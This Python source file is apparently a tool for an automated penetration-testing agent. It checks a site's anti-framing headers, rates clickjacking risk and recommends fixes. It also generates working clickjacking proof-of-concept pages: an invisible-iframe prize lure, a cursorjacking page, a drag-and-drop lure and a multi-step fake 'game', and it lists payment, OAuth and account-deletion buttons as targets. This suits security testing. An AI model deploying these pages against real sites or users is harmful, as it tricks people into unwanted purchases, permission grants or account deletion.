"""
Clickjacking Tester - UI redressing vulnerability detection.

Complements the clickjacking.jinja prompt module with automated testing capabilities.
"""

import html
from typing import Any, Literal

import httpx

from strix.tools.registry import register_tool
from strix.tools.validation import (
    validate_action_param,
    validate_required_param,
    validate_unknown_params,
)

ClickjackingAction = Literal[
    "check_headers",
    "test_frameable",
    "generate_poc",
    "analyze",
    "generate_multi_step",
]

VALID_ACTIONS = [
    "check_headers",
    "test_frameable",
    "generate_poc",
    "analyze",
    "generate_multi_step",
]


@register_tool
def clickjacking_tester(
    action: ClickjackingAction,
    url: str,
    target_element: str | None = None,
    button_text: str | None = None,
    steps: str | None = None,
    headers: str | None = None,
    timeout: int = 10,
    **kwargs: Any,
) -> dict[str, Any]:
    """
    Test for clickjacking / UI redressing vulnerabilities.

    Analyzes frame protection headers, tests if pages can be embedded,
    and generates proof-of-concept attack pages.

    Args:
        action: The testing action to perform
        url: Target URL to test
        target_element: CSS selector for target element in PoC
        button_text: Text for decoy button in PoC
        steps: JSON array of step URLs for multi-step PoC
        headers: Additional headers as JSON string
        timeout: Request timeout in seconds

    Returns:
        Dictionary containing test results
    """
    unknown = validate_unknown_params(
        kwargs,
        ["action", "url", "target_element", "button_text", "steps", "headers", "timeout"],
    )
    if unknown:
        return {"error": f"Unknown parameters: {unknown}"}

    action_error = validate_action_param(action, VALID_ACTIONS)
    if action_error:
        return action_error

    url_error = validate_required_param(url, "url")
    if url_error:
        return url_error

    try:
        if action == "check_headers":
            return _check_headers(url, headers, timeout)
        elif action == "test_frameable":
            return _test_frameable(url, headers, timeout)
        elif action == "generate_poc":
            return _generate_poc(url, target_element, button_text)
        elif action == "analyze":
            return _analyze_clickjacking(url, headers, timeout)
        elif action == "generate_multi_step":
            return _generate_multi_step_poc(url, steps, button_text)
        else:
            return {"error": f"Unknown action: {action}"}
    except httpx.RequestError as e:
        return {"error": f"Request failed: {e!s}"}
    except Exception as e:
        return {"error": f"Test failed: {e!s}"}


def _check_headers(url: str, headers: str | None, timeout: int) -> dict[str, Any]:
    """Check for frame protection headers."""
    import json

    results = {
        "url": url,
        "x_frame_options": None,
        "csp_frame_ancestors": None,
        "protected": False,
        "vulnerabilities": [],
        "recommendations": [],
    }

    extra_headers = {}
    if headers:
        try:
            extra_headers = json.loads(headers)
        except json.JSONDecodeError:
            pass

    with httpx.Client(timeout=timeout, follow_redirects=True) as client:
        resp = client.get(url, headers=extra_headers)

        # Check X-Frame-Options
        xfo = resp.headers.get("x-frame-options", "").upper()
        if xfo:
            results["x_frame_options"] = {
                "value": xfo,
                "effective": xfo in ["DENY", "SAMEORIGIN"],
            }

            if xfo == "DENY":
                results["protected"] = True
            elif xfo == "SAMEORIGIN":
                results["protected"] = True
                results["recommendations"].append("SAMEORIGIN allows same-origin framing")
            elif xfo.startswith("ALLOW-FROM"):
                results["vulnerabilities"].append("ALLOW-FROM is deprecated and poorly supported")
                origin = xfo.replace("ALLOW-FROM", "").strip()
                results["x_frame_options"]["allowed_origin"] = origin
        else:
            results["vulnerabilities"].append("Missing X-Frame-Options header")

        # Check CSP frame-ancestors
        csp = resp.headers.get("content-security-policy", "")
        if "frame-ancestors" in csp.lower():
            # Extract frame-ancestors directive
            directives = csp.split(";")
            for directive in directives:
                if "frame-ancestors" in directive.lower():
                    value = directive.split("frame-ancestors")[-1].strip()
                    results["csp_frame_ancestors"] = {
                        "value": value,
                        "effective": True,
                    }

                    if "'none'" in value.lower():
                        results["protected"] = True
                    elif "'self'" in value.lower():
                        results["protected"] = True
                        results["recommendations"].append("frame-ancestors 'self' allows same-origin framing")
                    elif "*" in value:
                        results["vulnerabilities"].append("Wildcard in frame-ancestors may be exploitable")
                        results["protected"] = False

                    break
        else:
            if not results["x_frame_options"]:
                results["vulnerabilities"].append("Missing CSP frame-ancestors directive")

        # Check for both missing
        if not results["x_frame_options"] and not results["csp_frame_ancestors"]:
            results["vulnerable"] = True
            results["vulnerabilities"].append("Page has no frame protection - likely vulnerable to clickjacking")
        else:
            results["vulnerable"] = not results["protected"]

    return results


def _test_frameable(url: str, headers: str | None, timeout: int) -> dict[str, Any]:
    """Test if page can be embedded in an iframe."""
    import json

    results = {
        "url": url,
        "frameable": None,
        "header_check": {},
        "test_html": "",
    }

    extra_headers = {}
    if headers:
        try:
            extra_headers = json.loads(headers)
        except json.JSONDecodeError:
            pass

    # Check headers first
    header_results = _check_headers(url, headers, timeout)
    results["header_check"] = header_results

    # Determine frameability based on headers
    if header_results.get("vulnerable"):
        results["frameable"] = True
        results["reason"] = "No frame protection headers present"
    elif not header_results.get("protected"):
        results["frameable"] = True
        results["reason"] = "Weak or misconfigured frame protection"
    else:
        results["frameable"] = False
        results["reason"] = "Frame protection headers prevent embedding"

    # Generate test HTML
    escaped_url = html.escape(url)
    results["test_html"] = f'''<!DOCTYPE html>
<html>
<head>
    <title>Clickjacking Frame Test</title>
    <style>
        iframe {{
            width: 100%;
            height: 600px;
            border: 2px solid #333;
        }}
        .status {{
            padding: 10px;
            margin: 10px 0;
            font-family: monospace;
        }}
        .vulnerable {{ background: #ffcccc; }}
        .protected {{ background: #ccffcc; }}
    </style>
</head>
<body>
    <h1>Clickjacking Test for: {escaped_url}</h1>
    <div id="status" class="status">Testing...</div>
    <iframe id="target" src="{escaped_url}"></iframe>
    <script>
        const iframe = document.getElementById('target');
        const status = document.getElementById('status');

        iframe.onload = function() {{
            status.textContent = 'Page loaded in iframe - POTENTIALLY VULNERABLE';
            status.className = 'status vulnerable';
        }};

        iframe.onerror = function() {{
            status.textContent = 'Frame blocked - Protected';
            status.className = 'status protected';
        }};

        // Timeout check
        setTimeout(function() {{
            if (status.textContent === 'Testing...') {{
                status.textContent = 'Frame may be blocked by browser or headers';
                status.className = 'status protected';
            }}
        }}, 5000);
    </script>
</body>
</html>'''

    return results


def _generate_poc(url: str, target_element: str | None, button_text: str | None) -> dict[str, Any]:
    """Generate clickjacking proof-of-concept HTML."""
    escaped_url = html.escape(url)
    decoy_text = button_text or "Click here to claim your prize!"
    target_css = target_element or "/* Target element position */"

    poc_basic = f'''<!DOCTYPE html>
<html>
<head>
    <title>Clickjacking PoC - Basic</title>
    <style>
        body {{
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 20px;
        }}

        .container {{
            position: relative;
            width: 1000px;
            height: 700px;
        }}

        iframe {{
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            opacity: 0.0001; /* Nearly invisible */
            z-index: 2;
            border: none;
        }}

        .decoy-button {{
            position: absolute;
            top: 200px;  /* Adjust to align with target button */
            left: 300px; /* Adjust to align with target button */
            padding: 15px 30px;
            font-size: 18px;
            background: #4CAF50;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            z-index: 1;
        }}

        h1 {{
            color: #333;
        }}

        /* Debug mode - set opacity to 0.5 to see iframe */
        .debug iframe {{
            opacity: 0.5;
        }}
    </style>
</head>
<body>
    <h1>🎉 Congratulations! You've won!</h1>
    <p>Click the button below to claim your prize.</p>

    <div class="container">
        <button class="decoy-button">{html.escape(decoy_text)}</button>
        <iframe src="{escaped_url}"></iframe>
    </div>

    <script>
        // Toggle debug mode with 'd' key
        document.addEventListener('keydown', function(e) {{
            if (e.key === 'd') {{
                document.body.classList.toggle('debug');
            }}
        }});
    </script>

    <!--
    INSTRUCTIONS:
    1. Adjust .decoy-button top/left to align with target element
    2. Press 'd' to toggle debug mode and see iframe
    3. Target URL: {escaped_url}
    4. Target element: {target_css}
    -->
</body>
</html>'''

    poc_cursorjacking = f'''<!DOCTYPE html>
<html>
<head>
    <title>Clickjacking PoC - Cursorjacking</title>
    <style>
        body {{
            cursor: none;
            margin: 0;
            padding: 20px;
            font-family: Arial, sans-serif;
        }}

        #fake-cursor {{
            position: fixed;
            width: 24px;
            height: 24px;
            pointer-events: none;
            z-index: 9999;
            background: url('data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24"><path d="M0 0l8 20 3-7 7-3z" fill="black"/></svg>');
        }}

        iframe {{
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            opacity: 0.0001;
            z-index: 1;
            border: none;
        }}

        .safe-button {{
            position: fixed;
            top: 200px;
            left: 100px;
            padding: 15px 30px;
            font-size: 18px;
            background: #2196F3;
            color: white;
            border: none;
            border-radius: 5px;
        }}
    </style>
</head>
<body>
    <h1>Click the button to continue</h1>
    <div id="fake-cursor"></div>
    <button class="safe-button">Safe Button</button>
    <iframe src="{escaped_url}"></iframe>

    <script>
        const cursor = document.getElementById('fake-cursor');
        const OFFSET_X = -250; // Cursor appears 250px left of real position
        const OFFSET_Y = 0;

        document.addEventListener('mousemove', function(e) {{
            cursor.style.left = (e.clientX + OFFSET_X) + 'px';
            cursor.style.top = (e.clientY + OFFSET_Y) + 'px';
        }});
    </script>
</body>
</html>'''

    poc_drag_drop = f'''<!DOCTYPE html>
<html>
<head>
    <title>Clickjacking PoC - Drag and Drop</title>
    <style>
        body {{
            font-family: Arial, sans-serif;
            padding: 20px;
        }}

        #drag-source {{
            width: 150px;
            height: 100px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            display: flex;
            align-items: center;
            justify-content: center;
            cursor: move;
            border-radius: 10px;
            font-weight: bold;
            margin: 20px 0;
        }}

        #drop-zone {{
            width: 300px;
            height: 200px;
            border: 3px dashed #ccc;
            border-radius: 10px;
            display: flex;
            align-items: center;
            justify-content: center;
            position: relative;
            margin: 20px 0;
        }}

        #drop-zone iframe {{
            position: absolute;
            width: 100%;
            height: 100%;
            opacity: 0.0001;
            border: none;
        }}

        .success {{
            border-color: #4CAF50 !important;
            background: #e8f5e9;
        }}
    </style>
</head>
<body>
    <h1>🎁 Drag to Win!</h1>
    <p>Drag the box to the drop zone to claim your prize!</p>

    <div id="drag-source" draggable="true">DRAG ME</div>

    <div id="drop-zone">
        <span>Drop Here</span>
        <iframe src="{escaped_url}"></iframe>
    </div>

    <script>
        const source = document.getElementById('drag-source');
        const zone = document.getElementById('drop-zone');

        source.addEventListener('dragstart', function(e) {{
            e.dataTransfer.setData('text/plain', 'prize');
        }});

        zone.addEventListener('dragover', function(e) {{
            e.preventDefault();
        }});

        zone.addEventListener('drop', function(e) {{
            e.preventDefault();
            zone.classList.add('success');
            zone.querySelector('span').textContent = '🎉 Dropped!';
        }});
    </script>
</body>
</html>'''

    return {
        "url": url,
        "poc_basic": poc_basic,
        "poc_cursorjacking": poc_cursorjacking,
        "poc_drag_drop": poc_drag_drop,
        "instructions": [
            "1. Save one of the PoC templates as an HTML file",
            "2. Open in browser and press 'd' to toggle debug mode",
            "3. Adjust button position to align with target element",
            "4. Test that clicking decoy triggers target action",
        ],
    }


def _analyze_clickjacking(url: str, headers: str | None, timeout: int) -> dict[str, Any]:
    """Comprehensive clickjacking vulnerability analysis."""
    results = {
        "url": url,
        "header_analysis": {},
        "risk_level": "unknown",
        "attack_vectors": [],
        "recommendations": [],
    }

    # Check headers
    header_results = _check_headers(url, headers, timeout)
    results["header_analysis"] = header_results

    # Determine risk level
    if header_results.get("vulnerable"):
        results["risk_level"] = "high"
        results["attack_vectors"] = [
            "Basic iframe overlay attack",
            "Cursorjacking (fake cursor position)",
            "Double-click attack",
            "Drag-and-drop attack",
            "Touch-based clickjacking (mobile)",
        ]
    elif not header_results.get("protected"):
        results["risk_level"] = "medium"
        results["attack_vectors"] = [
            "Bypass weak frame protection",
            "Same-origin framing if applicable",
        ]
    else:
        results["risk_level"] = "low"
        results["attack_vectors"] = []

    # Generate recommendations
    if not header_results.get("x_frame_options"):
        results["recommendations"].append("Add X-Frame-Options: DENY header")

    if not header_results.get("csp_frame_ancestors"):
        results["recommendations"].append("Add Content-Security-Policy: frame-ancestors 'none'")

    if results["risk_level"] != "low":
        results["recommendations"].extend([
            "Implement both X-Frame-Options and CSP frame-ancestors for defense in depth",
            "Use frame-busting JavaScript as additional protection",
            "Require user confirmation for sensitive actions",
            "Implement CSRF tokens for state-changing operations",
        ])

    # Sensitive actions to test
    results["test_targets"] = [
        "Login/logout buttons",
        "Settings change forms",
        "OAuth authorization buttons",
        "Payment/purchase buttons",
        "Account deletion confirmation",
        "Permission grant dialogs",
    ]

    return results


def _generate_multi_step_poc(url: str, steps: str | None, button_text: str | None) -> dict[str, Any]:
    """Generate multi-step clickjacking PoC for complex attacks."""
    import json

    step_urls = [url]
    if steps:
        try:
            step_urls = json.loads(steps)
        except json.JSONDecodeError:
            step_urls = [url]

    if len(step_urls) < 2:
        step_urls = [url, url]  # At least 2 steps

    button_texts = [
        button_text or "Start Game",
        "Continue",
        "Claim Prize",
        "Confirm",
    ]

    steps_html = []
    for i, step_url in enumerate(step_urls[:4]):  # Max 4 steps
        escaped_url = html.escape(step_url)
        btn_text = button_texts[i] if i < len(button_texts) else f"Step {i + 1}"
        display = "block" if i == 0 else "none"
        next_step = i + 2 if i < len(step_urls) - 1 else -1

        onclick = f'nextStep({next_step})' if next_step > 0 else 'complete()'

        steps_html.append(f'''
        <div id="step{i + 1}" class="step" style="display: {display}">
            <h2>Step {i + 1}: {btn_text}</h2>
            <button onclick="{onclick}">{html.escape(btn_text)}</button>
            <iframe src="{escaped_url}"></iframe>
        </div>''')

    poc = f'''<!DOCTYPE html>
<html>
<head>
    <title>Multi-Step Clickjacking PoC</title>
    <style>
        body {{
            font-family: Arial, sans-serif;
            padding: 20px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            margin: 0;
        }}

        .step {{
            position: relative;
            background: white;
            padding: 30px;
            border-radius: 15px;
            max-width: 800px;
            margin: 0 auto;
            box-shadow: 0 10px 40px rgba(0,0,0,0.3);
        }}

        .step h2 {{
            margin-top: 0;
            color: #333;
        }}

        .step button {{
            padding: 15px 40px;
            font-size: 18px;
            background: #4CAF50;
            color: white;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            position: relative;
            z-index: 1;
        }}

        .step iframe {{
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            opacity: 0.0001;
            z-index: 2;
            border: none;
        }}

        #complete {{
            display: none;
            text-align: center;
            color: white;
            padding: 50px;
        }}

        .debug .step iframe {{
            opacity: 0.5;
        }}
    </style>
</head>
<body>
    {''.join(steps_html)}

    <div id="complete">
        <h1>🎉 Congratulations!</h1>
        <p>Multi-step attack completed</p>
    </div>

    <script>
        function nextStep(step) {{
            document.querySelectorAll('.step').forEach(el => el.style.display = 'none');
            if (step > 0) {{
                document.getElementById('step' + step).style.display = 'block';
            }}
        }}

        function complete() {{
            document.querySelectorAll('.step').forEach(el => el.style.display = 'none');
            document.getElementById('complete').style.display = 'block';
        }}

        // Toggle debug mode with 'd' key
        document.addEventListener('keydown', function(e) {{
            if (e.key === 'd') {{
                document.body.classList.toggle('debug');
            }}
        }});
    </script>
</body>
</html>'''

    return {
        "step_count": len(step_urls),
        "step_urls": step_urls,
        "poc_html": poc,
        "instructions": [
            "1. Save the PoC as an HTML file",
            "2. Press 'd' to toggle debug mode and see iframes",
            "3. Each step loads a different target URL",
            "4. User clicks through 'game' while performing actions on target",
        ],
    }
